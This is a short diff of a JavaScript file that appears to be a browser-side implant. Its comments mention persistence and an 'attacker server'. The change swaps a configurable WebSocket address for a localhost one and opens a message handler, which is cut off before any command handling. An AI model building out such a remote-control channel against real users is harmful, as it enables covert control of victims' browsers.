@@ -1,15 +1,10 @@
-(() => { // Don't pollute global namespace
-    console.log('stuff')
-    const config = require('../config')
-
+(() => {
     // TODO implement persistence
 
     (() => {
-        console.log('loaded')
-
         // TODO build file using a config containing the attacker server
-        const id = Math.floor(Math.random() * (2 ** 32))
-        const ws_url = 'ws://' + config.url + ':' + config.port + config.wspath + '/' + id
+        const id = Math.floor(Math.random() * (2 ** 16))
+        const ws_url = 'ws://localhost:8080/ws/' + id
         const ws = new WebSocket(ws_url)
 
         ws.onmessage = (msg) => {
